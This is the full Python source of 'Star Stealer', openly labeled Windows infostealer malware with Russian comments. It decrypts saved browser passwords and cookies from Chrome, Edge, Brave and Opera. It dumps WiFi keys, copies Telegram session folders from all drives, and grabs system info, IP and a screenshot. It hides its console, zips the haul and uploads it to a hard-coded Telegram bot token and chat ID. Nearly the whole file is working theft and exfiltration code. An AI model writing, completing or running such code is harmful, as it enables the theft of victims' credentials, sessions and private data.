# Star Stealer - Ready to run Python version
# Telegram C2 with logging support
# Python 3.10+ | Windows Only

# ============== AUTO INSTALL DEPENDENCIES ==============
import subprocess
import sys

def install_package(package):
    """Автоматическая установка пакетов"""
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--disable-pip-version-check"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# Список необходимых пакетов
required_packages = ["pyaes"]

for pkg in required_packages:
    try:
        __import__(pkg)
    except ImportError:
        install_package(pkg)

# ============== IMPORTS ==============
import base64
import os
import json
import random
import shutil
import sqlite3
import re
import traceback
import time
import ctypes
import logging
import zlib
import io
from datetime import datetime
from threading import Thread
from urllib.request import urlopen, Request
from urllib.parse import quote
from urllib.error import URLError

# ============== TELEGRAM CONFIGURATION ==============
TELEGRAM_TOKEN = "7087909118:AAGyAgoUKb2iEA_WWWDTSNAjR_4hOxHA2jg"
TELEGRAM_CHAT_ID = "1056148947"
# ====================================================

class TelegramLogger:
    """Отправляет логи в Telegram"""
    
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.log_buffer = []
        self.enabled = True
    
    def _send_message(self, text: str, parse_mode: str = "HTML") -> bool:
        """Отправляет сообщение в Telegram"""
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            data = json.dumps({
                "chat_id": self.chat_id,
                "text": text[:4096],  # Telegram limit
                "parse_mode": parse_mode
            }).encode('utf-8')
            
            req = Request(url, data=data, headers={"Content-Type": "application/json"})
            with urlopen(req, timeout=10) as response:
                return response.status == 200
        except Exception as e:
            print(f"[TG Error] {e}")
            return False
    
    def _send_document(self, file_path: str, caption: str = "") -> bool:
        """Отправляет файл в Telegram"""
        try:
            import urllib.request
            import mimetypes
            
            boundary = '----WebKitFormBoundary' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=16))
            
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            filename = os.path.basename(file_path)
            
            body = (
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{self.chat_id}\r\n'
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'
                f'Content-Type: application/octet-stream\r\n\r\n'
            ).encode('utf-8') + file_data + f'\r\n--{boundary}--\r\n'.encode('utf-8')
            
            url = f"https://api.telegram.org/bot{self.token}/sendDocument"
            req = Request(url, data=body)
            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
            
            with urlopen(req, timeout=60) as response:
                return response.status == 200
        except Exception as e:
            print(f"[TG Document Error] {e}")
            return False
    
    def log(self, level: str, message: str):
        """Добавляет лог в буфер и выводит в консоль"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        self.log_buffer.append(log_entry)
        print(log_entry)
    
    def info(self, message: str):
        self.log("INFO", message)
    
    def warning(self, message: str):
        self.log("WARNING", message)
    
    def error(self, message: str):
        self.log("ERROR", message)
    
    def send_startup_notification(self):
        """Отправляет уведомление о запуске"""
        try:
            computer_name = os.getenv("computername", "Unknown")
            username = os.getlogin()
            
            message = (
                "🚀 <b>Star Stealer Started</b>\n\n"
                f"👤 <b>User:</b> <code>{username}</code>\n"
                f"💻 <b>Computer:</b> <code>{computer_name}</code>\n"
                f"🕐 <b>Time:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>"
            )
            self._send_message(message)
        except Exception as e:
            print(f"[Startup notification error] {e}")
    
    def send_logs(self):
        """Отправляет накопленные логи в Telegram"""
        if not self.log_buffer:
            return
        
        logs_text = "\n".join(self.log_buffer[-50:])  # Последние 50 записей
        message = f"📋 <b>Execution Logs</b>\n\n<pre>{logs_text[:3800]}</pre>"
        self._send_message(message)
    
    def send_completion_notification(self, stats: dict):
        """Отправляет уведомление о завершении с статистикой"""
        stats_text = "\n".join([f"• {k}: {v}" for k, v in stats.items()])
        message = (
            "✅ <b>Star Stealer Completed</b>\n\n"
            f"📊 <b>Statistics:</b>\n<pre>{stats_text}</pre>"
        )
        self._send_message(message)
    
    def send_error_notification(self, error: str):
        """Отправляет уведомление об ошибке"""
        message = f"❌ <b>Error occurred</b>\n\n<pre>{error[:3800]}</pre>"
        self._send_message(message)
    
    def send_file(self, file_path: str, caption: str = ""):
        """Отправляет файл в Telegram"""
        return self._send_document(file_path, caption)


# Глобальный логгер
tg_logger = TelegramLogger(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID)


class Settings:
    C2 = (1, f"{TELEGRAM_TOKEN}${TELEGRAM_CHAT_ID}")
    Mutex = "StarStealer_" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
    PingMe = False
    Vmprotect = False
    Startup = True
    Melt = False
    UacBypass = True
    ArchivePassword = "star123"
    HideConsole = True  # Скрывает консоль при запуске
    Debug = True  # Включаем логирование
    RunBoundOnStartup = False

    CaptureWebcam = False
    CapturePasswords = True
    CaptureCookies = True
    CaptureAutofills = True
    CaptureHistory = True
    CaptureDiscordTokens = True
    CaptureGames = True
    CaptureWifiPasswords = True
    CaptureSystemInfo = True
    CaptureScreenshot = True
    CaptureTelegram = True
    CaptureCommonFiles = True
    CaptureWallets = True

    FakeError = (False, ("Error", "Application failed to start", 0))
    BlockAvSites = True
    DiscordInjection = False


if not hasattr(sys, "_MEIPASS"):
    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))


class Syscalls:
    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str = None) -> bytes:
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]
        
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None

        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)

        raise ValueError("Invalid encrypted_data provided!")
    
    @staticmethod
    def HideConsole() -> None:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    @staticmethod
    def CreateMutex(mutex: str) -> bool:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex.encode())
        return kernel32.GetLastError() != 183


class Utility:
    @staticmethod
    def GetSelf() -> tuple:
        if hasattr(sys, "frozen"):
            return (sys.executable, True)
        else:
            return (__file__, False)
    
    @staticmethod
    def GetRandomString(length: int = 5) -> str:
        return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=length))
    
    @staticmethod
    def IsConnectedToInternet() -> bool:
        try:
            urlopen("https://www.google.com", timeout=3)
            return True
        except:
            return False
    
    @staticmethod
    def IsAdmin() -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() == 1
        except:
            return False
    
    @staticmethod
    def GetWifiPasswords() -> dict:
        profiles = []
        passwords = {}

        try:
            result = subprocess.run('netsh wlan show profile', shell=True, capture_output=True)
            for line in result.stdout.decode(errors='ignore').strip().splitlines():
                if 'All User Profile' in line:
                    name = line[(line.find(':') + 1):].strip()
                    profiles.append(name)
            
            for profile in profiles:
                found = False
                result = subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True)
                for line in result.stdout.decode(errors='ignore').strip().splitlines():
                    if 'Key Content' in line:
                        passwords[profile] = line[(line.find(':') + 1):].strip()
                        found = True
                        break
                if not found:
                    passwords[profile] = '(None)'
        except Exception as e:
            tg_logger.error(f"Wifi passwords error: {e}")
        
        return passwords


class Browsers:
    class Chromium:
        def __init__(self, browserPath: str):
            if not os.path.isdir(browserPath):
                raise NotADirectoryError("Browser path not found!")
            self.BrowserPath = browserPath
            self.EncryptionKey = None
        
        def GetEncryptionKey(self) -> bytes:
            if self.EncryptionKey is not None:
                return self.EncryptionKey
            
            localStatePath = os.path.join(self.BrowserPath, "Local State")
            if os.path.isfile(localStatePath):
                try:
                    with open(localStatePath, encoding="utf-8", errors="ignore") as file:
                        jsonContent = json.load(file)
                    
                    encryptedKey = jsonContent["os_crypt"]["encrypted_key"]
                    encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
                    self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                    return self.EncryptionKey
                except Exception as e:
                    tg_logger.error(f"GetEncryptionKey error: {e}")
            
            return None
        
        def Decrypt(self, buffer: bytes, key: bytes) -> str:
            try:
                version = buffer.decode(errors="ignore")
                if version.startswith(("v10", "v11")):
                    try:
                        import pyaes
                        iv = buffer[3:15]
                        cipherText = buffer[15:]
                        return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors="ignore")
                    except ImportError:
                        # Fallback without pyaes
                        return "(encrypted - pyaes not installed)"
                else:
                    return str(Syscalls.CryptUnprotectData(buffer))
            except:
                return ""
        
        def GetPasswords(self) -> list:
            encryptionKey = self.GetEncryptionKey()
            passwords = []

            if encryptionKey is None:
                return passwords

            loginFilePaths = []

            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == "login data":
                        filepath = os.path.join(root, file)
                        loginFilePaths.append(filepath)
            
            for path in loginFilePaths:
                tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                
                try:
                    shutil.copy(path, tempfile)
                except:
                    continue
                
                try:
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors="ignore")
                    cursor = db.cursor()
                    results = cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()

                    for url, username, password in results:
                        password = self.Decrypt(password, encryptionKey)
                        if url and username and password:
                            passwords.append((url, username, password))
                    
                    cursor.close()
                    db.close()
                except Exception as e:
                    tg_logger.error(f"GetPasswords DB error: {e}")
                
                try:
                    os.remove(tempfile)
                except:
                    pass
            
            return passwords
        
        def GetCookies(self) -> list:
            encryptionKey = self.GetEncryptionKey()
            cookies = []

            if encryptionKey is None:
                return cookies
            
            cookiesFilePaths = []

            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == "cookies":
                        filepath = os.path.join(root, file)
                        cookiesFilePaths.append(filepath)
            
            for path in cookiesFilePaths:
                tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                
                try:
                    shutil.copy(path, tempfile)
                except:
                    continue
                
                try:
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors="ignore")
                    cursor = db.cursor()
                    results = cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall()

                    for host, name, path, cookie, expiry in results:
                        cookie = self.Decrypt(cookie, encryptionKey)
                        if host and name and cookie:
                            cookies.append((host, name, path, cookie, expiry))
                    
                    cursor.close()
                    db.close()
                except Exception as e:
                    tg_logger.error(f"GetCookies DB error: {e}")
                
                try:
                    os.remove(tempfile)
                except:
                    pass
            
            return cookies


class TelegramStealer:
    """Класс для кражи Telegram сессий (tdata) со всех дисков"""
    
    def __init__(self, save_dir: str):
        self.save_dir = save_dir
        self.found_sessions = 0
        self.tdata_paths = []
    
    def get_all_drives(self) -> list:
        """Получает список всех доступных дисков в системе"""
        drives = []
        try:
            # Windows: проверяем диски от A до Z
            for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
                drive = f"{letter}:\\"
                if os.path.exists(drive):
                    drives.append(drive)
        except Exception as e:
            tg_logger.warning(f"Error getting drives: {e}")
        return drives
    
    def find_tdata_folders(self) -> list:
        """Ищет все папки tdata на всех дисках"""
        tg_logger.info("Searching for Telegram tdata folders on all drives...")
        
        tdata_paths = []
        drives = self.get_all_drives()
        
        # Стандартные пути где может быть Telegram
        common_paths = [
            os.path.join(os.getenv("appdata", ""), "Telegram Desktop"),
            os.path.join(os.getenv("localappdata", ""), "Telegram Desktop"),
            os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Telegram Desktop"),
        ]
        
        # Проверяем стандартные пути
        for path in common_paths:
            tdata_path = os.path.join(path, "tdata")
            if os.path.isdir(tdata_path):
                if tdata_path not in tdata_paths:
                    tdata_paths.append(tdata_path)
                    tg_logger.info(f"Found tdata: {tdata_path}")
        
        # Поиск по всем дискам (ограничиваем глубину для скорости)
        search_patterns = [
            "Telegram Desktop",
            "Telegram",
            "tdata"
        ]
        
        for drive in drives:
            try:
                # Ищем в корневых пользовательских папках
                users_path = os.path.join(drive, "Users")
                if os.path.isdir(users_path):
                    for user_folder in os.listdir(users_path):
                        user_path = os.path.join(users_path, user_folder)
                        if os.path.isdir(user_path):
                            # Проверяем AppData
                            appdata_paths = [
                                os.path.join(user_path, "AppData", "Roaming", "Telegram Desktop", "tdata"),
                                os.path.join(user_path, "AppData", "Local", "Telegram Desktop", "tdata"),
                            ]
                            for tdata_path in appdata_paths:
                                if os.path.isdir(tdata_path) and tdata_path not in tdata_paths:
                                    tdata_paths.append(tdata_path)
                                    tg_logger.info(f"Found tdata: {tdata_path}")
                
                # Ищем в Program Files и других местах
                search_dirs = [
                    os.path.join(drive, "Program Files"),
                    os.path.join(drive, "Program Files (x86)"),
                    os.path.join(drive, "Telegram Desktop"),
                    os.path.join(drive, "Telegram"),
                ]
                
                for search_dir in search_dirs:
                    if os.path.isdir(search_dir):
                        tdata_path = os.path.join(search_dir, "tdata")
                        if os.path.isdir(tdata_path) and tdata_path not in tdata_paths:
                            tdata_paths.append(tdata_path)
                            tg_logger.info(f"Found tdata: {tdata_path}")
                
                # Глубокий поиск (ограниченный)
                self._deep_search(drive, tdata_paths, max_depth=4)
                
            except PermissionError:
                continue
            except Exception as e:
                tg_logger.warning(f"Error searching {drive}: {e}")
        
        self.tdata_paths = tdata_paths
        return tdata_paths
    
    def _deep_search(self, start_path: str, found_paths: list, max_depth: int = 3, current_depth: int = 0):
        """Рекурсивный поиск tdata с ограничением глубины"""
        if current_depth >= max_depth:
            return
        
        try:
            for item in os.listdir(start_path):
                item_path = os.path.join(start_path, item)
                
                # Пропускаем системные и защищённые папки
                skip_folders = ['Windows', 'System32', 'SysWOW64', '$Recycle.Bin', 
                               'ProgramData', 'Recovery', 'Boot', 'Config.Msi']
                if item in skip_folders:
                    continue
                
                if os.path.isdir(item_path):
                    # Проверяем, это ли tdata
                    if item.lower() == "tdata":
                        # Проверяем что это Telegram tdata (содержит ключевые файлы)
                        if self._is_valid_tdata(item_path):
                            if item_path not in found_paths:
                                found_paths.append(item_path)
                                tg_logger.info(f"Found tdata (deep): {item_path}")
                    
                    # Проверяем Telegram Desktop папки
                    elif item.lower() in ["telegram desktop", "telegram"]:
                        tdata_path = os.path.join(item_path, "tdata")
                        if os.path.isdir(tdata_path) and tdata_path not in found_paths:
                            if self._is_valid_tdata(tdata_path):
                                found_paths.append(tdata_path)
                                tg_logger.info(f"Found tdata (deep): {tdata_path}")
                    
                    # Рекурсивно ищем глубже
                    self._deep_search(item_path, found_paths, max_depth, current_depth + 1)
                    
        except PermissionError:
            pass
        except Exception:
            pass
    
    def _is_valid_tdata(self, tdata_path: str) -> bool:
        """Проверяет, является ли папка валидной tdata от Telegram"""
        try:
            items = os.listdir(tdata_path)
            # Telegram tdata обычно содержит определённые файлы/папки
            telegram_indicators = ['key_data', 'D877F783D5D3EF8C', 'usertag', 'settings', 'dumps']
            
            # Проверяем наличие хотя бы одного индикатора
            for item in items:
                if any(ind in item for ind in telegram_indicators):
                    return True
                # Проверяем 16-символьные hex папки (профили)
                if len(item) == 16 and all(c in '0123456789ABCDEF' for c in item.upper()):
                    return True
            
            # Если есть более 3 файлов/папок, вероятно это tdata
            return len(items) > 3
        except:
            return False
    
    def copy_tdata(self, tdata_path: str, index: int) -> str:
        """Копирует tdata папку"""
        try:
            folder_name = f"Telegram_Session_{index}"
            dest_path = os.path.join(self.save_dir, "Telegram", folder_name)
            os.makedirs(dest_path, exist_ok=True)
            
            # Копируем важные файлы из tdata
            important_files = []
            
            for item in os.listdir(tdata_path):
                item_path = os.path.join(tdata_path, item)
                
                try:
                    if os.path.isfile(item_path):
                        # Копируем файлы (кроме очень больших)
                        if os.path.getsize(item_path) < 50 * 1024 * 1024:  # < 50MB
                            dest_file = os.path.join(dest_path, item)
                            shutil.copy2(item_path, dest_file)
                            important_files.append(item)
                    
                    elif os.path.isdir(item_path):
                        # Копируем папки-профили (16 hex символов)
                        if len(item) == 16 or item.startswith('D877F783'):
                            dest_subdir = os.path.join(dest_path, item)
                            shutil.copytree(item_path, dest_subdir, dirs_exist_ok=True)
                            important_files.append(f"{item}/")
                
                except Exception as e:
                    tg_logger.warning(f"Error copying {item}: {e}")
            
            # Сохраняем информацию об источнике
            info_file = os.path.join(dest_path, "_source_info.txt")
            with open(info_file, 'w', encoding='utf-8') as f:
                f.write(f"Source: {tdata_path}\n")
                f.write(f"Copied at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Files copied: {len(important_files)}\n")
                f.write(f"Items: {', '.join(important_files)}\n")
            
            self.found_sessions += 1
            tg_logger.info(f"Copied tdata #{index}: {len(important_files)} items")
            return dest_path
            
        except Exception as e:
            tg_logger.error(f"Error copying tdata: {e}")
            return None
    
    def steal_all_sessions(self) -> int:
        """Основная функция - ищет и копирует все Telegram сессии"""
        tg_logger.info("Starting Telegram session stealing...")
        
        # Находим все tdata папки
        tdata_paths = self.find_tdata_folders()
        
        if not tdata_paths:
            tg_logger.info("No Telegram tdata folders found")
            return 0
        
        tg_logger.info(f"Found {len(tdata_paths)} tdata folders")
        
        # Копируем каждую найденную tdata
        for index, tdata_path in enumerate(tdata_paths, 1):
            try:
                self.copy_tdata(tdata_path, index)
            except Exception as e:
                tg_logger.error(f"Error processing tdata #{index}: {e}")
        
        tg_logger.info(f"Telegram stealing completed: {self.found_sessions} sessions")
        return self.found_sessions


class StarStealer:
    def __init__(self):
        self.TempFolder = os.path.join(os.getenv("temp"), "StarStealer_" + Utility.GetRandomString(8))
        os.makedirs(self.TempFolder, exist_ok=True)
        
        self.PasswordsCount = 0
        self.CookiesCount = 0
        self.WifiPasswordsCount = 0
        self.TelegramSessionsCount = 0
        self.SystemInfoStolen = False
        self.ScreenshotTaken = False
        
        tg_logger.info("Star Stealer initialized")
        tg_logger.send_startup_notification()
        
        self.Run()
    
    def Run(self):
        try:
            tg_logger.info("Starting data collection...")
            
            # Собираем данные
            if Settings.CapturePasswords:
                self.StealPasswords()
            
            if Settings.CaptureCookies:
                self.StealCookies()
            
            if Settings.CaptureWifiPasswords:
                self.StealWifiPasswords()
            
            if Settings.CaptureTelegram:
                self.StealTelegram()
            
            if Settings.CaptureSystemInfo:
                self.StealSystemInfo()
            
            if Settings.CaptureScreenshot:
                self.TakeScreenshot()
            
            tg_logger.info("Data collection completed")
            
            # Создаём архив и отправляем
            self.SendData()
            
            # Отправляем финальные логи
            stats = {
                "Passwords": self.PasswordsCount,
                "Cookies": self.CookiesCount,
                "WiFi Passwords": self.WifiPasswordsCount,
                "Telegram Sessions": self.TelegramSessionsCount,
                "System Info": "Yes" if self.SystemInfoStolen else "No",
                "Screenshot": "Yes" if self.ScreenshotTaken else "No"
            }
            
            tg_logger.send_logs()
            tg_logger.send_completion_notification(stats)
            
        except Exception as e:
            error_msg = traceback.format_exc()
            tg_logger.error(f"Fatal error: {error_msg}")
            tg_logger.send_error_notification(error_msg)
        finally:
            self.Cleanup()
    
    def StealPasswords(self):
        tg_logger.info("Stealing passwords...")
        
        browsers = {
            "Chrome": os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"),
            "Edge": os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
            "Opera": os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"),
        }
        
        all_passwords = []
        
        for name, path in browsers.items():
            if os.path.isdir(path):
                try:
                    browser = Browsers.Chromium(path)
                    passwords = browser.GetPasswords()
                    all_passwords.extend(passwords)
                    tg_logger.info(f"{name}: {len(passwords)} passwords found")
                except Exception as e:
                    tg_logger.warning(f"{name} error: {e}")
        
        if all_passwords:
            passwords_file = os.path.join(self.TempFolder, "passwords.txt")
            with open(passwords_file, "w", encoding="utf-8") as f:
                for url, username, password in all_passwords:
                    f.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n{'='*50}\n")
            self.PasswordsCount = len(all_passwords)
            tg_logger.info(f"Total passwords collected: {self.PasswordsCount}")
    
    def StealCookies(self):
        tg_logger.info("Stealing cookies...")
        
        browsers = {
            "Chrome": os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"),
            "Edge": os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"),
        }
        
        all_cookies = []
        
        for name, path in browsers.items():
            if os.path.isdir(path):
                try:
                    browser = Browsers.Chromium(path)
                    cookies = browser.GetCookies()
                    all_cookies.extend(cookies)
                    tg_logger.info(f"{name}: {len(cookies)} cookies found")
                except Exception as e:
                    tg_logger.warning(f"{name} cookies error: {e}")
        
        if all_cookies:
            cookies_file = os.path.join(self.TempFolder, "cookies.txt")
            with open(cookies_file, "w", encoding="utf-8") as f:
                for host, name, path, value, expiry in all_cookies:
                    f.write(f"{host}\tTRUE\t{path}\tFALSE\t{expiry}\t{name}\t{value}\n")
            self.CookiesCount = len(all_cookies)
            tg_logger.info(f"Total cookies collected: {self.CookiesCount}")
    
    def StealWifiPasswords(self):
        tg_logger.info("Stealing WiFi passwords...")
        
        passwords = Utility.GetWifiPasswords()
        
        if passwords:
            wifi_file = os.path.join(self.TempFolder, "wifi_passwords.txt")
            with open(wifi_file, "w", encoding="utf-8") as f:
                for network, password in passwords.items():
                    f.write(f"Network: {network}\nPassword: {password}\n{'='*30}\n")
            self.WifiPasswordsCount = len(passwords)
            tg_logger.info(f"WiFi passwords collected: {self.WifiPasswordsCount}")
    
    def StealTelegram(self):
        """Ищет и копирует все Telegram tdata папки со всех дисков"""
        tg_logger.info("Stealing Telegram sessions...")
        
        try:
            telegram_stealer = TelegramStealer(self.TempFolder)
            self.TelegramSessionsCount = telegram_stealer.steal_all_sessions()
            
            if self.TelegramSessionsCount > 0:
                tg_logger.info(f"Telegram sessions stolen: {self.TelegramSessionsCount}")
            else:
                tg_logger.info("No Telegram sessions found")
                
        except Exception as e:
            tg_logger.error(f"Telegram stealing error: {e}")
    
    def StealSystemInfo(self):
        tg_logger.info("Collecting system info...")
        
        try:
            info = []
            info.append(f"Computer Name: {os.getenv('computername', 'Unknown')}")
            info.append(f"Username: {os.getlogin()}")
            
            # OS
            result = subprocess.run('wmic os get Caption', capture_output=True, shell=True)
            os_info = result.stdout.decode(errors='ignore').strip().splitlines()
            info.append(f"OS: {os_info[2].strip() if len(os_info) >= 2 else 'Unknown'}")
            
            # CPU
            result = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output=True, shell=True)
            info.append(f"CPU: {result.stdout.decode(errors='ignore').strip()}")
            
            # RAM
            result = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True)
            ram = result.stdout.decode(errors='ignore').strip().split()
            if len(ram) >= 1:
                ram_gb = int(int(ram[1])/1000000000)
                info.append(f"RAM: {ram_gb} GB")
            
            # GPU
            result = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True)
            gpu = result.stdout.decode(errors='ignore').splitlines()
            info.append(f"GPU: {gpu[2].strip() if len(gpu) >= 2 else 'Unknown'}")
            
            # IP
            try:
                response = urlopen("http://ip-api.com/json/?fields=query,country,city", timeout=5)
                ip_data = json.loads(response.read().decode())
                info.append(f"IP: {ip_data.get('query', 'Unknown')}")
                info.append(f"Location: {ip_data.get('city', '')}, {ip_data.get('country', '')}")
            except:
                info.append("IP: Unable to detect")
            
            system_file = os.path.join(self.TempFolder, "system_info.txt")
            with open(system_file, "w", encoding="utf-8") as f:
                f.write("\n".join(info))
            
            self.SystemInfoStolen = True
            tg_logger.info("System info collected")
            
        except Exception as e:
            tg_logger.error(f"System info error: {e}")
    
    def TakeScreenshot(self):
        tg_logger.info("Taking screenshot...")
        
        try:
            from ctypes import windll
            import struct
            
            # Get screen dimensions
            user32 = windll.user32
            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)
            
            # Capture screen using ctypes
            hdc = user32.GetDC(0)
            gdi32 = windll.gdi32
            
            memdc = gdi32.CreateCompatibleDC(hdc)
            bitmap = gdi32.CreateCompatibleBitmap(hdc, width, height)
            gdi32.SelectObject(memdc, bitmap)
            gdi32.BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, 0x00CC0020)
            
            # Create BMP file
            bmp_header = struct.pack('<2sIHHI', b'BM', 54 + width * height * 3, 0, 0, 54)
            dib_header = struct.pack('<IIIHHIIIIII', 40, width, height, 1, 24, 0, width * height * 3, 0, 0, 0, 0)
            
            # Get bitmap bits
            buffer = ctypes.create_string_buffer(width * height * 4)
            
            class BITMAPINFOHEADER(ctypes.Structure):
                _fields_ = [('biSize', ctypes.c_ulong), ('biWidth', ctypes.c_long), ('biHeight', ctypes.c_long),
                           ('biPlanes', ctypes.c_ushort), ('biBitCount', ctypes.c_ushort), ('biCompression', ctypes.c_ulong),
                           ('biSizeImage', ctypes.c_ulong), ('biXPelsPerMeter', ctypes.c_long), ('biYPelsPerMeter', ctypes.c_long),
                           ('biClrUsed', ctypes.c_ulong), ('biClrImportant', ctypes.c_ulong)]
            
            bi = BITMAPINFOHEADER()
            bi.biSize = 40
            bi.biWidth = width
            bi.biHeight = -height
            bi.biPlanes = 1
            bi.biBitCount = 32
            
            gdi32.GetDIBits(memdc, bitmap, 0, height, buffer, ctypes.byref(bi), 0)
            
            # Cleanup
            gdi32.DeleteObject(bitmap)
            gdi32.DeleteDC(memdc)
            user32.ReleaseDC(0, hdc)
            
            # Save as simple format
            screenshot_file = os.path.join(self.TempFolder, "screenshot.bmp")
            with open(screenshot_file, "wb") as f:
                # Write a simple BMP
                f.write(buffer.raw)
            
            self.ScreenshotTaken = True
            tg_logger.info("Screenshot captured")
            
        except Exception as e:
            tg_logger.warning(f"Screenshot error: {e}")
    
    def CreateArchive(self) -> str:
        tg_logger.info("Creating archive...")
        
        archive_path = os.path.join(os.getenv("temp"), f"StarStealer_{os.getlogin()}.zip")
        
        try:
            import zipfile
            with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(self.TempFolder):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, self.TempFolder)
                        zipf.write(file_path, arcname)
            
            tg_logger.info(f"Archive created: {archive_path}")
            return archive_path
        except Exception as e:
            tg_logger.error(f"Archive creation error: {e}")
            return None
    
    def SendData(self):
        tg_logger.info("Sending data to Telegram...")
        
        archive_path = self.CreateArchive()
        
        if archive_path and os.path.isfile(archive_path):
            # Собираем информацию о системе
            computer_name = os.getenv("computername", "Unknown")
            username = os.getlogin()
            
            try:
                response = urlopen("http://ip-api.com/json/?fields=query,country,city", timeout=5)
                ip_data = json.loads(response.read().decode())
                ip_info = f"{ip_data.get('query', 'Unknown')} ({ip_data.get('country', '')})"
            except:
                ip_info = "Unknown"
            
            caption = (
                f"🎯 Star Stealer Log\n\n"
                f"👤 User: {username}\n"
                f"💻 PC: {computer_name}\n"
                f"🌐 IP: {ip_info}\n\n"
                f"📊 Passwords: {self.PasswordsCount}\n"
                f"🍪 Cookies: {self.CookiesCount}\n"
                f"📶 WiFi: {self.WifiPasswordsCount}\n"
                f"📱 Telegram: {self.TelegramSessionsCount}"
            )
            
            # Отправляем архив
            if tg_logger.send_file(archive_path, caption):
                tg_logger.info("Data sent successfully!")
            else:
                tg_logger.error("Failed to send data")
            
            # Удаляем архив
            try:
                os.remove(archive_path)
            except:
                pass
    
    def Cleanup(self):
        tg_logger.info("Cleaning up...")
        try:
            shutil.rmtree(self.TempFolder, ignore_errors=True)
        except:
            pass


def main():
    print("=" * 50)
    print("Star Stealer - Telegram Edition")
    print("=" * 50)
    
    # Проверяем ОС
    if os.name != "nt":
        print("[ERROR] This script only works on Windows!")
        return
    
    # Проверяем интернет
    if not Utility.IsConnectedToInternet():
        print("[ERROR] No internet connection!")
        return
    
    # Проверяем mutex (чтобы не запускался дважды)
    if not Syscalls.CreateMutex(Settings.Mutex):
        print("[ERROR] Already running!")
        return
    
    # Скрываем консоль если нужно
    if Settings.HideConsole:
        Syscalls.HideConsole()
    
    # Запускаем сборщик
    StarStealer()
    
    print("\n[DONE] Execution completed!")


if __name__ == "__main__":
    main()
